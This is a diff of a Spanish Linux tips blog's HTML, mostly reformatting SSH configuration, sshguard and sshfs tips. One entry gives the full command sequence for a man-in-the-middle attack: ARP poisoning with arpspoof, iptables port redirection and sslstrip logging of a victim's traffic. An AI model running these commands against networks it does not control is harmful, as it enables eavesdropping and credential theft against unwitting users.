@@ -97,7 +97,7 @@
   
 
 
-<time datetime="2013-12-15T15:46:00+01:00" pubdate data-updated="true">15-12-2013</time>
+<time datetime="2013-12-15T16:15:00+01:00" pubdate data-updated="true">15-12-2013</time>
         
       </p>
     
@@ -159,7 +159,7 @@
   
 
 
-<time datetime="2013-12-15T15:46:00+01:00" pubdate data-updated="true">15-12-2013</time>
+<time datetime="2013-12-15T16:15:00+01:00" pubdate data-updated="true">15-12-2013</time>
         
       </p>
     
@@ -197,7 +197,7 @@
   
 
 
-<time datetime="2013-12-15T15:46:00+01:00" pubdate data-updated="true">15-12-2013</time>
+<time datetime="2013-12-15T16:15:00+01:00" pubdate data-updated="true">15-12-2013</time>
         
       </p>
     
@@ -239,7 +239,7 @@
   
 
 
-<time datetime="2013-12-15T15:46:00+01:00" pubdate data-updated="true">15-12-2013</time>
+<time datetime="2013-12-15T16:15:00+01:00" pubdate data-updated="true">15-12-2013</time>
         
       </p>
     
@@ -250,29 +250,29 @@
 
 <p>Configuración de reenvío de paquetes IP:</p>
 
-<blockquote><h1>echo 1 > /proc/sys/net/ipv4/ip_forward</h1></blockquote>
+<blockquote><p># echo 1 > /proc/sys/net/ipv4/ip_forward</p></blockquote>
 
 <p>Envenenamiento ARP (paquete dsniff):</p>
 
-<blockquote><h1>arpspoof -i eth0 -t ip_victima ip_router</h1></blockquote>
+<blockquote><p># arpspoof -i eth0 -t ip_victima ip_router</p></blockquote>
 
 <p>En caso de querer atacar toda la red, solo especificar la ip router:</p>
 
-<blockquote><h1>arpspoof -i eth0 ip_router</h1></blockquote>
+<blockquote><p># arpspoof -i eth0 ip_router</p></blockquote>
 
 <p>Redirección de puertos usando Iptables:</p>
 
-<blockquote><h1>iptables -t nat -A PREROUTING -p tcp &#8211;destination-port 80 -j REDIRECT &#8211;to-ports 31715</h1></blockquote>
+<blockquote><p># iptables -t nat -A PREROUTING -p tcp &#8211;destination-port 80 -j REDIRECT &#8211;to-ports 31715</p></blockquote>
 
 <p>Al reiniciar el ordenador se borrará la regla, si se quiere borrar al momento cambiar &#8220;-A&#8221; por un &#8220;-D&#8221; en el comando anterior.</p>
 
 <p>Arrancar sslstrip y ponerlo a la escucha:</p>
 
-<blockquote><h1>sslstrip -k -f -l 31715 -w archivo.log</h1></blockquote>
+<blockquote><p># sslstrip -k -f -l 31715 -w archivo.log</p></blockquote>
 
 <p>Visionar en tiempo real los paquetes capturados:</p>
 
-<blockquote><h1>tail -f archivo.log</h1></blockquote>
+<blockquote><p>#  tail -f archivo.log</p></blockquote>
 </div>
   
   
@@ -301,7 +301,7 @@
   
 
 
-<time datetime="2013-12-15T15:46:00+01:00" pubdate data-updated="true">15-12-2013</time>
+<time datetime="2013-12-15T16:15:00+01:00" pubdate data-updated="true">15-12-2013</time>
         
       </p>
     
@@ -341,7 +341,7 @@
   
 
 
-<time datetime="2013-12-15T15:46:00+01:00" pubdate data-updated="true">15-12-2013</time>
+<time datetime="2013-12-15T16:15:00+01:00" pubdate data-updated="true">15-12-2013</time>
         
       </p>
     
@@ -350,21 +350,22 @@
 
   <div class="entry-content"><p>Demonio que protege SSH y otros servicios contra ataques de fuerza bruta. Funciona observando los cambios en /var/log/auth.log, verificando si alguien esta fallando varias veces al autentificarse. Luego de varios errores de autentificacion (por defecto 14) el host ofensivo sera bloqueado por 7 minutos y se duplicará cada vez que el host ofensivo repita el ataque. Carece de archivo de configuración y puede complementarse con iptables:</p>
 
-<blockquote><h1>iptables -A INPUT -j sshguard (Para activarlo en todos los puertos)</h1>
+<blockquote><p># iptables -A INPUT -j sshguard (Para activarlo en todos los puertos)</p>
 
-<h1>iptables -A INPUT -m multiport -p tcp &#8211;destination-ports 21,22 -j sshguard (Para puertos concretos [ftp y ssh])</h1></blockquote>
+<p># iptables -A INPUT -m multiport -p tcp &#8211;destination-ports 21,22 -j sshguard (Para puertos concretos [ftp y ssh])</p></blockquote>
 
 <p>El archivo para colocar las direcciones no afectadas por sshguard:</p>
 
-<blockquote><h1>nano /etc/sshguard/whitelist</h1></blockquote>
+<blockquote><p># nano /etc/sshguard/whitelist</p></blockquote>
 
 <p>Con el siguiente formato:</p>
 
-<p>192.168.1.53 (Una ip)</p>
+<pre><code>192.168.1.53 (Una ip)
 
-<p>192.168.1.0/24 (Un rango)</p>
+192.168.1.0/24 (Un rango)
 
-<p>lapipaplena.net (Un host)</p>
+lapipaplena.net (Un host)
+</code></pre>
 </div>
   
   
@@ -393,7 +394,7 @@
   
 
 
-<time datetime="2013-12-15T15:46:00+01:00" pubdate data-updated="true">15-12-2013</time>
+<time datetime="2013-12-15T16:15:00+01:00" pubdate data-updated="true">15-12-2013</time>
         
       </p>
     
@@ -402,9 +403,9 @@
 
   <div class="entry-content"><p>Montar un sistema de archivos remoto en local.</p>
 
-<blockquote><h1>sshfs usuario@host_o_IP:/home/usuario /home/usuario/remoto</h1>
+<blockquote><p># sshfs usuario@host_o_IP:/home/usuario /home/usuario/remoto</p>
 
-<h1>fusermount -u /home/usuario/remoto  (Desmontarlo)</h1></blockquote>
+<p># fusermount -u /home/usuario/remoto  (Desmontarlo)</p></blockquote>
 </div>
   
   
@@ -433,7 +434,7 @@
   
 
 
-<time datetime="2013-12-15T15:46:00+01:00" pubdate data-updated="true">15-12-2013</time>
+<time datetime="2013-12-15T16:15:00+01:00" pubdate data-updated="true">15-12-2013</time>
         
       </p>
     
@@ -471,7 +472,7 @@
   
 
 
-<time datetime="2013-12-15T15:46:00+01:00" pubdate data-updated="true">15-12-2013</time>
+<time datetime="2013-12-15T16:15:00+01:00" pubdate data-updated="true">15-12-2013</time>
         
       </p>
     
@@ -490,7 +491,7 @@
 
 <p>Para ver la huella digital cada vez que se ingresa en un host remoto:</p>
 
-<blockquote><h1>nano /etc/ssh/ssh_config</h1></blockquote>
+<blockquote><p># nano /etc/ssh/ssh_config</p></blockquote>
 
 <p>Descomentar la linea y dejarla:</p>
 
@@ -523,7 +524,7 @@
   
 
 
-<time datetime="2013-12-15T15:46:00+01:00" pubdate data-updated="true">15-12-2013</time>
+<time datetime="2013-12-15T16:15:00+01:00" pubdate data-updated="true">15-12-2013</time>
         
       </p>
     
@@ -552,7 +553,7 @@
 
 <p>$ ssh usuario@host &#8220;tar -cf - /home/usuario/dir&#8221; | gzip dir.tar.gz (Comprimir un directorio remoto)</p>
 
-<h1>gedit /var/run/motd   (modificar el mensaje de bienvenida de ssh)</h1></blockquote>
+<p># gedit /var/run/motd   (modificar el mensaje de bienvenida de ssh)</p></blockquote>
 
 <p>1.-</p>
 
@@ -566,7 +567,7 @@
 
 <p>2.-</p>
 
-<blockquote><h1>gedit /etc/issue.net   (modificar el mensaje antes del login. Para activarlo, descomentar del archivo “/etc/ssh/sshd_config” la línea: Banner /etc/issue.net)</h1></blockquote>
+<blockquote><p># gedit /etc/issue.net   (modificar el mensaje antes del login. Para activarlo, descomentar del archivo “/etc/ssh/sshd_config” la línea: Banner /etc/issue.net)</p></blockquote>
 
 <p>3.-</p>
 
@@ -592,9 +593,9 @@
 
 <p>Para deshabilitar el acceso a todos los usuarios excepto a root:</p>
 
-<blockquote><h1>touch /etc/nologin</h1>
+<blockquote><p># touch /etc/nologin</p>
 
-<h1>chmod 644 /etc/nologin</h1></blockquote>
+<p># chmod 644 /etc/nologin</p></blockquote>
 
 <p>6.-</p>
 
@@ -602,7 +603,7 @@
 
 <blockquote><p>$ touch /home/usuario/.hushlogin (Creando este fichero vacio se deshabilitan los mensajes. Borrandolo vuelven a aparecer)</p>
 
-<h1>nano /etc/motd (Archivo para personalizar los mensaje de bienvenida a quien se loguea en el sistema)</h1></blockquote>
+<p># nano /etc/motd (Archivo para personalizar los mensaje de bienvenida a quien se loguea en el sistema)</p></blockquote>
 
 <p>7.-</p>
 
@@ -612,11 +613,12 @@
 
 <p>Y pegar el siguiente contenido debidamente modificado con nuestros datos:</p>
 
-<p>host servidor</p>
+<pre><code>host servidor
 
-<p>hostname 192.168.1.10</p>
+ hostname 192.168.1.10 
 
-<p>user USUARIO_REMOTO</p>
+ user USUARIO_REMOTO
+</code></pre>
 
 <p>Nota.- Delante de la segunda y tercera linea existe un espacio.</p>
 
@@ -632,17 +634,18 @@
 
 <p>Y pegar el siguiente contenido:</p>
 
-<p>Host *</p>
+<pre><code>Host *
 
-<p>ServerAliveInterval 120</p>
+    ServerAliveInterval 120
 
-<p>ServerAliveCountMax 3</p>
+    ServerAliveCountMax 3
+</code></pre>
 
 <p>9.-</p>
 
 <p>Añadir un registro de las acciones realizadas dentro de cada sesión SFTP</p>
 
-<blockquote><h1>nano /etc/ssh/sshd_config</h1></blockquote>
+<blockquote><p># nano /etc/ssh/sshd_config</p></blockquote>
 
 <p>Y dejar la linea como se indica:</p>
 
@@ -654,21 +657,22 @@
 
 <p>Aumentando la seguridad del servidor ssh:</p>
 
-<blockquote><h1>nano /etc/ssh/sshd_config</h1></blockquote>
+<blockquote><p># nano /etc/ssh/sshd_config</p></blockquote>
 
 <p>Y añadir o modificar las siguientes lineas:</p>
 
-<p>AllowUsers juan pedro andrés (Limitando a uno o varios los usuarios autorizados)</p>
+<pre><code>AllowUsers juan pedro andrés (Limitando a uno o varios los usuarios autorizados)
 
-<p>AllowGroup oficina (Restringir acceso a solo un grupo)</p>
+AllowGroup oficina (Restringir acceso a solo un grupo)
 
-<p>Port 372 (Modificando puerto. Aconsejable uno inferior al 1024)</p>
+Port 372 (Modificando puerto. Aconsejable uno inferior al 1024)
 
-<p>LoginGraceTime 40 (Mostrar la pantalla de login 40 segundos antes de cerrarse)</p>
+LoginGraceTime 40 (Mostrar la pantalla de login 40 segundos antes de cerrarse)
 
-<p>MaxStartups 4 (Cantidad máxima de conexiones simultaneas)</p>
+MaxStartups 4 (Cantidad máxima de conexiones simultaneas)
 
-<p>MaxAuthTries 3 (Limitar el número de intentos de logeo, tras los cuales se cierra la conexión)</p>
+MaxAuthTries 3 (Limitar el número de intentos de logeo, tras los cuales se cierra la conexión)
+</code></pre>
 
 <p>11.-</p>
 
@@ -676,23 +680,25 @@
 
 <p>En el servidor:</p>
 
-<blockquote><h1>nano /etc/ssh/sshd_config</h1></blockquote>
+<blockquote><p># nano /etc/ssh/sshd_config</p></blockquote>
 
-<p>AllowTcpForwarding yes</p>
+<pre><code>AllowTcpForwarding yes
 
-<p>X11Forwarding yes</p>
+X11Forwarding yes
 
-<p>X11DisplayOffset 10</p>
+X11DisplayOffset 10
 
-<p>X11UseLocalhost yes</p>
+X11UseLocalhost yes
+</code></pre>
 
 <p>En la máquina cliente:</p>
 
-<blockquote><h1>nano /etc/ssh/ssh_config</h1></blockquote>
+<blockquote><p># nano /etc/ssh/ssh_config</p></blockquote>
 
-<p>ForwardX11 yes</p>
+<pre><code>ForwardX11 yes
 
-<p>ForwardX11Trusted yes</p>
+ForwardX11Trusted yes
+</code></pre>
 
 <p>Después de reiniciar ssh, con el parámetro -X se visualizará la gui remota que tambien tiene que estar instalada en local.</p>
 
@@ -718,9 +724,9 @@
   
     <section>
 <h1>Número de entradas</h1>
-        <ul>
-        <li>1354</li>
-        </ul>
+	<ul>
+	<li>1354</li>
+	</ul>
 </section>
 <section>
   <h1>Añadidos/modificados</h1>
